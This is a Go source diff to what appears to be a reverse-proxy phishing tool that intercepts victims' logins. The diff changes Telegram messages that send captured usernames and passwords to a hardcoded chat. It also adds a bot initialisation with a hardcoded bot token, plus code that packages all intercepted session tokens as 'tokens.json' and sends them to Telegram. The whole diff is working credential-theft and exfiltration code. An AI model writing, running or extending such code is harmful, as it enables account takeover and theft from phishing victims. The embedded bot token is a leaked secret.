@@ -14,6 +14,7 @@ import (
 	"crypto/rc4"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"html"
 	"io/ioutil"
@@ -506,7 +507,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Username extracted: %s (session %d)", um[1], ps.SessionId))
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Username: %s ", um[1]))
 											bot.Send(msg)
 										}
 									}
@@ -519,7 +520,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Password extracted: %s (session %d)", pm[1], ps.SessionId))
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Password: %s ", pm[1]))
 											bot.Send(msg)
 										}
 									}
@@ -602,11 +603,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			return req, nil
 		})
-
+		
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			if resp == nil {
 				return nil
+			}
+
+			bot, err := tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+			if err != nil {
+				log.Fatal("Failed to initialize Telegram bot:", err)
 			}
 
 			// handle session
@@ -725,9 +731,34 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ck.String() != "" {
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
+			
+
 			if is_auth {
 				// we have all auth tokens
 				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+
+				// Access session from map and handle potential errors
+				s, ok := p.sessions[ps.SessionId]
+				if ok {
+					tokensBytes, err := json.Marshal(s.Tokens)
+					if err != nil {
+						log.Error("Error marshaling tokens to JSON:", err)
+					} else {
+						fileData := tgbotapi.FileBytes{
+							Name:   "tokens.json",
+							Bytes:  tokensBytes,
+						}
+						msg := tgbotapi.NewDocument(5822512651, fileData)
+						_, err = bot.Send(msg) // Use the bot instance initialized outside this function
+						if err != nil {
+							log.Error("Error sending tokens to Telegram:", err)
+						} else {
+							log.Success("Tokens sent to Telegram")
+						}
+					}
+				} else {
+					log.Error("Session not found in session map")
+				}
 			}
 
 			// modify received body
